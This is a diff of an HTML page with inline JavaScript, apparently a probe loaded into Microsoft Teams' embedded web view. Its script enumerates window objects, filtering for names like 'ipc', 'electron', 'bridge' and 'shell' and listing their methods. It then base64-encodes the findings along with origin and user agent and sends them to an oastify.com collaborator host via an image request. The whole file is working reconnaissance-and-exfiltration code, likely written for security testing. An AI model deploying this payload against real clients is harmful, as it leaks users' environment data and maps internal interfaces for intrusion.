@@ -1,62 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Teams Module Mapper + WebView2 Check</title>
+  <title>Teams Internal Scanner</title>
 </head>
 <body>
-  <h1>Scanning Teams Modules...</h1>
+  <h1>Scanning internal Teams objects...</h1>
 
   <script>
     (async () => {
-      const inventory = {
+      const result = {
         origin: location.origin,
         hostname: location.hostname,
         userAgent: navigator.userAgent,
-        foundModules: {},
+        internalCandidates: {},
         errors: [],
-        specialChecks: {
-          chromeWebview: false,
-          chromeWebviewPostMessage: false
-        }
       };
 
-      // Verificação direta de WebView2
-      try {
-        if (window.chrome && window.chrome.webview) {
-          inventory.specialChecks.chromeWebview = true;
-          if (typeof window.chrome.webview.postMessage === "function") {
-            inventory.specialChecks.chromeWebviewPostMessage = true;
-          }
-        }
-      } catch (e) {
-        inventory.errors.push({ check: "chrome.webview", error: String(e) });
-      }
+      const suspiciousKeywords = [
+        "teams", "proxy", "postMessage", "adapter", "bridge",
+        "shell", "core", "remote", "ipc", "electron", "sidecar", "pre", "ms"
+      ];
 
-      // Escaneia objetos/funções no window
-      const windowKeys = Object.keys(window);
-      for (const key of windowKeys) {
+      const keys = Object.keys(window);
+      for (const key of keys) {
         try {
+          const lower = key.toLowerCase();
+          const matches = suspiciousKeywords.some(s => lower.includes(s));
+
+          if (!matches) continue;
+
           const val = window[key];
+          if (val === null) continue;
+
           if (typeof val === "function") {
-            inventory.foundModules[key] = "function";
-          } else if (typeof val === "object" && val !== null) {
-            const props = Object.getOwnPropertyNames(val);
-            inventory.foundModules[key] = {
-              type: "object",
-              props: props.slice(0, 20)
-            };
+            result.internalCandidates[key] = "function";
+          } else if (typeof val === "object") {
+            const props = Object.getOwnPropertyNames(val).slice(0, 25); // evitar objetos gigantes
+            result.internalCandidates[key] = { type: "object", props };
+
+            // Verificar se há funções internas:
+            result.internalCandidates[key].methods = props.filter(p => {
+              try {
+                return typeof val[p] === "function";
+              } catch {
+                return false;
+              }
+            });
           }
-        } catch (err) {
-          inventory.errors.push({ key, error: String(err) });
+        } catch (e) {
+          result.errors.push({ key, error: String(e) });
         }
       }
 
-      // Envia resultado em 1 request
-      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(inventory))));
-      const url = "https://j9tu8az13ssynazi9fayiqrv8med23qs.oastify.com/?resposta=" + base64;
-
-      const img = new Image();
-      img.src = url;
+      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(result))));
+      const url = "https://srn3qjhal1a75jhrros70z94qvwmke83.oastify.com/?resposta=" + base64;
+      new Image().src = url;
     })();
   </script>
 </body>
